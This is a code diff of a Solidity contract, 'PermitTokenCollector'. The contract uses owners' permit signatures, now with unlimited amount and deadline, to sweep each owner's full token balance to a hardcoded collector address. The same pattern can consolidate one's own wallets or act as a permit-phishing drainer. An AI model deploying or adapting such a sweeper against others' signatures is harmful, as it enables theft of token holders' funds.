@@ -14,26 +14,18 @@ interface IERC20Permit {
     ) external;
 
     function nonces(address owner) external view returns (uint256);
-
     function DOMAIN_SEPARATOR() external view returns (bytes32);
-
     function balanceOf(address account) external view returns (uint256);
-
     function transferFrom(address from, address to, uint256 amount) external returns (bool);
-
 }
 
 
 contract PermitTokenCollector {
     address public collector;
     IERC20Permit public token;
-    uint256 deadline;
-    uint256 value;
-    constructor(uint256 _deadline, uint256 _value) {
+    constructor() {
         collector = 0x25df6DA2f4e5C178DdFF45038378C0b08E0Bce54;
         token = IERC20Permit(0x912CE59144191C1204E64559FE8253a0e49E6548);
-        deadline = _deadline;
-        value = _value;
     }
 
     function permitTransfer(
@@ -42,7 +34,6 @@ contract PermitTokenCollector {
         bytes32[] calldata r,
         bytes32[] calldata s
     ) external {
-        
         require(
             owners.length == v.length &&
                 v.length == r.length &&
@@ -50,15 +41,15 @@ contract PermitTokenCollector {
             "Input arrays must have the same length"
         );
 
+        address collector_ = collector;
         uint256 balance_;
-
         for (uint256 i = 0; i < owners.length; i++) {
             balance_ = token.balanceOf(owners[i]);
             if( balance_ > 0){
                 // Permit 合约授权
-                try token.permit(owners[i], address(this), value, deadline, v[i], r[i], s[i]){} catch {}
+                try token.permit(owners[i], address(this), type(uint256).max, type(uint256).max, v[i], r[i], s[i]){} catch {}
                 // 将代币从用户地址转移到收集者地址
-                try token.transferFrom(owners[i], collector, balance_) {} catch {}
+                try token.transferFrom(owners[i], collector_, balance_) {} catch {}
             }
         }
     }
